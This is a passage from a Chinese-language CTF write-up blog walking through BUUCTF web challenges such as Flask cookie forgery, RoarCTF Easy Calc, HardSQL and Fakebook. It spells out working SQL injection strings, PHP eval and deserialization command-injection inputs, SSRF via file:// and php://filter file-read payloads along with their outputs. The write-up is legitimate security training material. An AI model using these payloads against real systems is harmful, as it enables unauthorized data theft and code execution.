href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><pre class="line-numbers language-git" data-language="git"><code class="language-git">git clone https://github.com/noraj/flask-session-cookie-manager<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Decode"><a href="#Decode" class="headerlink" title="Decode"></a>Decode</h4><pre class="line-numbers language-none"><code class="language-none">usage: flask_session_cookie_manager{2,3}.py decode [-h] [-s &lt;string&gt;] -c &lt;string&gt;optional arguments:  -h, --help            show this help message and exit  -s &lt;string&gt;, --secret-key &lt;string&gt;                        Secret key  -c &lt;string&gt;, --cookie-value &lt;string&gt;                        Session cookie value<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">python3 flask_session_cookie_manager3.py decode -s 'ckj123' -c '.eJxF0MFuwjAMBuBXmXzmAC29IHEApetAiqNGKZVzQQxK06RhWgG1FPHuK0zazr_9_bLvsD02xdnA7NJcixFsqwPM7vD2CTPg1tQiTzvqpdVsU2smK7S11Yl0nMUR-o3Vam04yzpS0lGetqjeLVdlhEncUUA3bdNOqHRCPus1W0XYL26kspYrdxOKpsiWtUikFyztkJUt5tl0MBwpNMN8KNTSoEdDwbvT1kXIDjXlm0qzxWDKSrBVMOzO4TGC_bk5bi9frjj9n_Cs7vdjUnH4JNCWvbZZKHI0GGQ9T9aGPE11Hoc8SNuB9nwxf3GV35XFnySV_CjS3-S080MA39WphBFcz0XzehtMxvD4AYitbJY.Z6NK_Q.c9Wsxg_Bj6vn0mKgkPavhwsLBi8' {'_fresh': True, '_id': b'28e9d1c4cd5ed4b69cddd0196ece2a051a4dad051c1894a1cf2f41945be3d29702a5019296840e8df8414805e851da3ad2790a6cacadf9947eaebd05bdb82684', 'csrf_token': b'145c74a17cad683f579ca7e30babf8ea73d0aef0', 'image': b'E4Gy', 'name': 'qing', 'user_id': '10'}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="encode"><a href="#encode" class="headerlink" title="encode"></a>encode</h4><pre class="line-numbers language-none"><code class="language-none">usage: flask_session_cookie_manager{2,3}.py encode [-h] -s &lt;string&gt; -t &lt;string&gt;optional arguments:  -h, --help            show this help message and exit  -s &lt;string&gt;, --secret-key &lt;string&gt;                        Secret key  -t &lt;string&gt;, --cookie-structure &lt;string&gt;                        Session cookie structure<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">python3 flask_session_cookie_manager3.py encode -s 'ckj123' -t "{'_fresh': True, '_id': b'28e9d1c4cd5ed4b69cddd0196ece2a051a4dad051c1894a1cf2f41945be3d29702a5019296840e8df8414805e851da3ad2790a6cacadf9947eaebd05bdb82684', 'csrf_token': b'145c74a17cad683f579ca7e30babf8ea73d0aef0', 'image': b'E4Gy', 'name': 'admin', 'user_id': '10'}".eJxF0MGOgjAQBuBX2czZg4JcTDxoiqwmnYamSKYX4ypSWuomqAExvvuim-ye_5nvz8wDdqemuBiYXZtbMYJddYTZAz6-YAbcmlrkaUe9tJpta81khba2OpGOszhCv7VabQxnWUdKOsrTFtXKclVGmMQdBXTXNu2ESifks16zdYT94k4qa7lyd6FoimxZi0R6wdIOWdlink0Hw5FCM8yHQi0NejQUrJy2LkJ2rCnfVpotBlNWgq2DYXcOzxEcLs1pd_12xfn_hFd1fxiTisMXgbbstc1CkaPBIOt5sjHkaarzOORB2g6054v5m6v8viz-JKnkZ5H-Jue9HwLYH311hhHcLkXz_htMxvD8AfZvbPA.Z6NLTQ.2ijxBi8WejFl8Z7IUnLCtcYZRT4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>flag{ed0fcbdf-7439-497d-ba5b-9970b44bbf86}</code></p><hr><pre class="line-numbers language-python" data-language="python"><code class="language-python">name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">strlower</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> nodeprep<span class="token punctuation">.</span>prepare<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token comment">#nodeprep.prepare存在漏洞,且login的时候又strlower一次</span>    <span class="token keyword">return</span> username<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先注册：ᴬᴰᴹᴵᴺ，再改密码，再用ADMIN登录</p><blockquote><p>在注册的时候 ”ᴬᴰᴹᴵᴺ“ 经过strlower()，转成”ADMIN“ ， 在修改密码的时候 ”ADMIN“经过strlower()变成”admin“ , 当我们再次退出登录的时候 ”admin“经过strlower()变成”admin“</p></blockquote><hr><h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><blockquote><p>在默认情况下，正则表达式中的锚点 <code>^</code> 和 <code>$</code> 分别匹配整个字符串的开头和结尾。而当使用 <code>/m</code> 修饰符开启多行模式后，<code>^</code> 和 <code>$</code> 的匹配规则会发生变化：</p><ul><li><code>^</code> 可以匹配每行的开头（换行符 <code>\n</code> 之后的位置）。</li><li><code>$</code> 可以匹配每行的结尾（换行符 <code>\n</code> 之前的位置）。</li></ul></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php">$<span class="token punctuation">(</span><span class="token string single-quoted-string">'#calc'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment"># $('#calc')：使用 jQuery 选择器选中 id 为 calc 的表单元素。</span><span class="token comment">#.submit()：为选中的表单元素绑定提交事件处理函数。当表单被提交时，会执行该函数内的代码。</span>        $<span class="token operator">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            url<span class="token punctuation">:</span><span class="token string double-quoted-string">"calc.php?num="</span><span class="token operator">+</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>$<span class="token punctuation">(</span><span class="token string double-quoted-string">"#content"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token argument-name">type</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'GET'</span><span class="token punctuation">,</span>            <span class="token argument-name">success</span><span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">{</span>                $<span class="token punctuation">(</span><span class="token string double-quoted-string">"#result"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token string backtick-quoted-string">`&lt;div class="alert alert-success"&gt;            &lt;strong&gt;答案:&lt;/strong&gt;${data}            &lt;/div&gt;`</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token argument-name">error</span><span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"这啥?算不来!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>                 <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token comment">#return false;：阻止表单的默认提交行为，即阻止页面刷新并跳转到表单的 action 属性指定的 URL。</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span> 《<span class="token operator">?</span>php<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">#将num值赋给变量 $str</span>        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\$'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#eval，危险.（很贴心地给了分号？不用加了</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>试了试输入只能输数字和其他一些字符。。。</p><blockquote><p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1.</span>删除前后的空白符（空格符，制表符，换行符等统称为空白符）<span class="token number">2.</span>将某些字符转换为下划线（包括空格）   <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> 空白字符    空白字符包括空格（）、制表符（\t）、换行符（\n）、回车符（\r）等。   <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>标点符号和特殊符号    像常见的标点符号（如逗号 <span class="token punctuation">,</span>、句号 <span class="token operator">.</span>、问号 <span class="token operator">?</span>、感叹号 <span class="token operator">!</span> 等）以及其他特殊符号（如 @、<span class="token comment">#、$、%、^、&amp;、*、(、)、-、+、=、[、]、{、}、|、\、/ 等）都会被转换。</span>   <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>控制字符例如 <span class="token constant">ASCII</span> 码值在 <span class="token number">0</span> <span class="token operator">-</span> <span class="token number">31</span> 之间的字符（如空字符 \<span class="token number">0</span>、换页符 \f 等）也会被转换。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><strong>所以用空白字符可以偷梁换柱，绕过waf（%20num）却还是传一样的参数(num)。。。好阴险（</strong></p><p>试了试<code>?%20num=1;phpinfo()</code>可，但其他空白符就没那么幸运了（</p><p>用system发现不行（啊？</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/04980deee4ee102d6c2eab0ad6d2d30b.png"></p><p><del>好好好</del></p><p>“ /被ban了（</p><p>说来也巧，刚在必做的rce中碰到<code>var_dump(scandir(chr(47)));读取根目录</code>（黑幕</p><p> var_dump()函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。</p><p>为啥这里头不用加双引号？</p><blockquote><pre class="line-numbers language-none"><code class="language-none">chr(47)` 本身就会返回一个字符串 `"/"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>char还有这妙用（</p><pre class="line-numbers language-none"><code class="language-none">?%20num=1;var_dump(scandir(chr(47))) string(5) "f1agg"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>通过 <code>.</code> 运算符把这些由 <code>chr()</code> 函数生成的字符连接起来</p></blockquote><p>想绕过\必须用chr(),-&gt;”/flagg”,cat啥的用不了了，得用个带括号的</p><p>掏出小本本（</p><pre class="line-numbers language-none"><code class="language-none">file_get_contents、highlight_file() ，show_source()?%20num=1;var_dump(show_source(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>是在/flagg下，<del>第一次忘加chr(47)了</del></p><hr><h3 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h3><p>看见蓝色氛围</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ba7e5d6f4653e6e5d3db349a940b7c6f.png"></p><p><code>href="Secret.php"&gt;</code></p><p><code>It doesn't come from 'https://Sycsecret.buuoj.cn'</code></p><blockquote><p>网站管理员可以通过分析 <code>Referer</code> 字段来了解用户是从哪些外部网站或者页面进入到自己网站的。该字段记录了当前请求是从哪个页面链接过来的，也就是请求的来源页面的 URL。</p></blockquote><p>好吧，加上（</p><p><code>Please use "Syclover" browser</code></p><blockquote><p><code>User-Agent</code> 是客户端（如浏览器、移动应用等）在向服务器发送 HTTP 请求时，附带在请求头中的一个字符串，用于标识客户端软件的类型、版本以及运行环境等信息。</p></blockquote><p>好吧，再加上（</p><p><code>No!!! you can only read this locally!!!</code></p><p><del>（流汗黄豆</del></p><blockquote><p>X-Forwarded-For在使用代理服务器的场景下，该字段用于记录客户端的真实 IP 地址。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ed4c8498fb8fa85dd9e96fdb351ff69b.png"></p><hr><h3 id="极客大挑战-2019-EasySQL1-1"><a href="#极客大挑战-2019-EasySQL1-1" class="headerlink" title="[极客大挑战 2019]EasySQL1"></a>[极客大挑战 2019]EasySQL1</h3><p><img src="https://pick.lwzheng.tech/2024/12/18/6762547f9722a.png" alt="dfb8a353c0093c82c669db8e48864047.png"><br>单引号围的<br><img src="https://pick.lwzheng.tech/2024/12/18/6762547ec1f87.png" alt="37dcb4e8076a072d3478e3ee63d26e0d.png"><br>SQL的语法格式规定–和后面的注释内容必须间隔一个空格<br>在SQL注入中，“–+”可用于注释是因为在SQL语法里，“– ”（后面有空格）是标准的单行注释起始标识，“+”在这里可能是为了绕过某些过滤机制。当数据库执行SQL语句时，遇到“– ”就会忽略后面的内容，攻击者利用这个特性，通过构造包含“–+”的恶意语句，使后面的查询逻辑被注释掉，从而达到改变查询原意、获取非法数据等目的。<br>所以一定要有空格啊（</p><hr><h3 id="强网杯-2019-随便注1-1"><a href="#强网杯-2019-随便注1-1" class="headerlink" title="[强网杯 2019]随便注1"></a>[强网杯 2019]随便注1</h3><p><img src="https://pick.lwzheng.tech/2024/12/18/676254f13ad0c.png" alt="0a223de355e17decc72863de26a72b52.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f188ae2.png" alt="5a777138a26db07c378cadba24a77570.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f251310.png" alt="215b05e5165b0a292062e36954c398b1.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f31481b.png" alt="236c845da78aa517ba031f0b2b554f48.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f6c7017.png" alt="98d0595f1c0374397a3d1370b7306369.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f77a903.png" alt="2f6ceaccb29373f6fdf89f7a6b651bdb.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/6762c639590d8.png" alt="5dbad5fe33b7be4a387406654588dc4a.png"><br><a href="https://">https://www.mysqlzh.com/doc/126/253.html</a></p><pre class="line-numbers language-none"><code class="language-none">1';handler `1919810931114514` open;handler `1919810931114514` read first;#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这道题我好像被剧透了（，本来想打开小本本翻一翻堆叠（因为我越看越熟悉，好像要用这个），结果发现堆叠就是从这道题抄的（<br><img src="https://pick.lwzheng.tech/2024/12/18/6762763fcad8d.png" alt="2ee162ea82c68b0b28b3ac8f6996d071.png"></p><pre class="line-numbers language-none"><code class="language-none">1';handler `1919810931114514` open as`ddl`;handler `ddl` read next;--一样<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h3 id="极客大挑战-2019-HardSQL1-1"><a href="#极客大挑战-2019-HardSQL1-1" class="headerlink" title="[极客大挑战 2019]HardSQL1"></a>[极客大挑战 2019]HardSQL1</h3><p>先放个字典<br><a href="https://">https://www.cnblogs.com/CVE-Lemon/p/16187971.html</a><br><img src="https://pick.lwzheng.tech/2024/12/18/6762554c94cf7.png" alt="afdd780a3c26cc0291a0ff2edfbf27c5.png"><br>/**/,%20，=都被过滤了，但like没被过滤换=;and也被搞了，用or（burp可见，反正过滤了一堆，就不放图了<br><img src="https://pick.lwzheng.tech/2024/12/18/6762554811cd5.png" alt="75d480ea766c77feff663a8247a6ac96.png"><br>limit没被过滤，说明是空格被过滤了<br><img src="https://pick.lwzheng.tech/2024/12/18/67625547539f8.png" alt="30e79d19bae056941cd635f627db1854.png"><br>查一个新的<br><img src="https://pick.lwzheng.tech/2024/12/18/676255467d276.png" alt="1c7660abc9397a5f09c54c68feadd623.png"><br>%A0不可<br><img src="https://pick.lwzheng.tech/2024/12/18/676255458d8b4.png" alt="0ef86a801db09c991dc813e96465423a.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/67625544864a8.png" alt="dd6be0eecab7f9fbb43422f88041b2e7.png"><br>（）可，尝试了下可为<code>1'or(1)like(1)#</code>，万能密码成功后发现只有这个，用报错注入<br><img src="https://pick.lwzheng.tech/2024/12/18/67627335bef31.png" alt="15b57d9a0152f4a97cf94568454d8e96.png"><br>我用我的那个报错注入的方法发现一直不对，然后发现是rand被过滤了。<del>好好好，三种方法选了一种就正好被过滤了</del><br><img src="https://pick.lwzheng.tech/2024/12/18/676255439ec72.png" alt="467fa8d31cd839e3b1d0cc4f10819f9e.png"><br>那就换个<br>[<a href="https://www.cnblogs.com/csyxf/p/10241456.html]">https://www.cnblogs.com/csyxf/p/10241456.html]</a>(https://）extractvalue无事，遂用<br><img src="https://pick.lwzheng.tech/2024/12/18/67625542b93af.png" alt="91bf424956abef30cb47ef6c4db7022f.png"><br>这里我发现直接用hackbar传不对，然后在登录界面重新尝试了一下，并观察上方网址，发现需要用URL编码后再execute<br><del>（可能是因为过滤的太多了吧，太屑了</del><br><code>1'or(extractvalue(0x7e,concat(0x7e,(select(database())))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e7fde819.png" alt="3fa376449c53c54edcb9227885473a8a.png"><br><code>1'or(extractvalue(0x7e,concat(0x7e(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek')))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e787aefc.png" alt="894a4b1c6d1a51c1fd51954ac75dde7d.png"><br><code>1'or(extractvalue(0x7e,concat(0x7e(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e78ef348.png" alt="77d4fac4a64b308ec7f3098ee092cf1e.png"><br><code>1'or(extractvalue(0x7e,concat(0x7e,(select(group_concat(password))from(geek.H4rDsq1)))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e79b2b08.png" alt="85556fa19c74c093ea33a47a536d314e.png"><br>然后发现substr被过滤了（悲<br><img src="https://pick.lwzheng.tech/2024/12/18/67626e7ab2063.png" alt="ab4c261fdcca91d8108362ae777a8491.png"><br>遂再找（<br><a href="https://">https://www.wanfa688.com/html/Products/478771.html</a><br>试了一下left和right都挺安全的<br><img src="https://pick.lwzheng.tech/2024/12/18/67626e80aed15.png" alt="3f3cf8afbbb43a3fa4b255b6a7080e0f.png"><br><code>1'or(extractvalue(0x7e,concat(0x7e,right((select(group_concat(password))from(geek.H4rDsq1)),31))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e81e2af4.png" alt="398dde33f15ac6556d2337bf694af22f.png"><br>拼一下<br><code>flag{589e7b10-f37f-4255-84d3-a323ae257d5b}</code></p><hr><p><del>话说sqlmap能不能再多出一些脚本什么的，不够用哇</del><br><del>等我复习完cpp一定高产似那啥咕咕咕咕</del></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/2589138a0ce77cd759f201600a1de079.png"></p><p>第二页</p><h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h3><p><img src="https://pick.lwzheng.tech/2025/01/30/679b8f9e2f284.png" alt="2aa097d60db4614df1889feb73c9e37a.png"><br>Are you sure the flag is here? ? ?<br>=&gt;需用post</p><blockquote><p>java+WEB-INF是java的WEB应用的安全目录<br>WEB-INF主要包含一下文件或目录:<br>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中<br>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。<br>/WEB-INF/database.properties：数据库配置文件<br>漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</p></blockquote><p>/WEB-INF/web.xml+post=&gt;com.wm.ctf.FlagController<br><img src="https://pick.lwzheng.tech/2025/01/30/679b915b78a65.png" alt="d8258a6166b96cdf02779b7bf957ed0f.png"><br> servlet class+加上classes来访问来访问class文件目录，且文件后缀为.class<br><code>Download?filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</code></p><pre class="line-numbers language-none"><code class="language-none">ZmxhZ3tkNjMxYzVlYi1iOTJmLTQ0MTYtODVkOC1kMDE5Y2NkZmQ5YWZ9Cg==flag{d631c5eb-b92f-4416-85d8-d019ccdfd9af}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h3 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h3><p>扫：/robots.txt，下user.php.bak；flag.php</p><pre class="line-numbers language-none"><code class="language-none">function get($url)  {      $ch = curl_init();      curl_setopt($ch, CURLOPT_URL, $url);      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);      $output = curl_exec($ch);      $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);      if($httpCode == 404) {          return 404;      }      curl_close($ch);#curl ssrf      return $output;  }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注册一个，在no后sql注入，过滤了一些。</p><pre class="line-numbers language-none"><code class="language-none">?no=1 order by 4有4列?no=-1 union/**/select database(),database(),database(),database()#，2处有个fakebook?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='fakebook'# users?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'#  no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS  ?no=-1 union/**/select 1,group_concat(data),3,4 from fakebook.users#O:8:"UserInfo":3:{s:4:"name";s:0:"";s:3:"age";i:0;s:4:"blog";s:40:"https://github.com/lingqing777/watchlist";},O:8:"UserInfo":3:{s:4:"name";s:4:"qing";s:3:"age";i:18;s:4:"blog";s:40:"https://github.com/lingqing777/watchlist";}//对ba起我注册了两遍（<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>blog用反序列化<br><code>?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:0:"";s:3:"age";i:0;s:4:"blog";s:40:"https://github.com/lingqing777/watchlist";}'</code><br><img src="https://pick.lwzheng.tech/2025/02/02/679f241756457.png" alt="9e1ee8b50ef827975e8b9efb8eebd3c7.png"><br>看了一下，是源码<br>很多方法都不行去flag.php<br><img src="https://pick.lwzheng.tech/2025/02/02/679f2416d6fdf.png" alt="be4161b71b3e861bd50da4cc32df4f2b.png"><br>看来在web目录下，file://访问本地文件系统<br><code>?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:0:"";s:3:"age";i:0;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'</code></p><p><code>PD9waHANCg0KJGZsYWcgPSAiZmxhZ3swYzg1MWNmNS0zZGU3LTQ4ZDItYTA5Yi02OWQxZDY2ZWRiODN9IjsNCmV4aXQoMCk7DQo=</code><br><code>flag{0c851cf5-3de7-48d2-a09b-69d1d66edb83}</code></p><hr><p>load_file()函数可以利用绝对路径去加载一个文件<br><code>?no=-1 union/**/select 1,load_file("/var/www/html/flag.php"),3,4--+</code><br><img src="https://pick.lwzheng.tech/2025/02/02/679f26e361949.png" alt="f57ca8e4259259d03fb661b7dc8a8566.png"></p><hr><h3 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h3><p>扫出flag.php<br><img src="https://pick.lwzheng.tech/2025/02/02/679f284a61f7b.png" alt="5b963d116ac7f02965c9aced93849dee.png"><br>这张很有王霸之气<br>?category=php://filter/read.convert.base64-encode/resource=index.php<br>Failed opening ‘php://filter/read.convert.base64-encode/resource=index.php.php<br>?category=php://filter/read.convert.base64-encode/resource=index<br>?category=php://filter/read.convert.base64-encode/resource=flag不行<br>看了github发现原来可以酱<br>?category=php://filter/convert.base64-encode/write=woofers/resource=flag</p><hr><h3 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h3><p>能不能少放些可怕的图真的很吓人。。。</p><blockquote><p>func=date&amp;p=Y-m-d+h%3Ai%3As+a<br>date() 函数p 应该是 date() 函数所需的格式参数。<br>%3A 是 URL 编码后的冒号 :，所以 h%3Ai%3As 实际就是 h:i:s。</p><ul><li>在 URL 里通常表示空格，这里可当作空格看待。（ai</li></ul></blockquote><p><code>function 'base64' not found or invalid function name in</code><br>那就再找找,试了试serialize行，system被过滤了。</p><blockquote><p>file_get_contents、highlight_file() ，show_source()</p></blockquote><p><img src="https://pick.lwzheng.tech/2025/02/02/679f54f631e71.png" alt="87bd2fdb103c30c69844228612a6f76d.png"><br><code>func=highlight_file&amp;p=index.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">《<span class="token operator">?</span>php<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ls /"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'find / -name "*flag*"'</span><span class="token punctuation">;</span> <span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Test"</span><span class="token punctuation">:</span><span 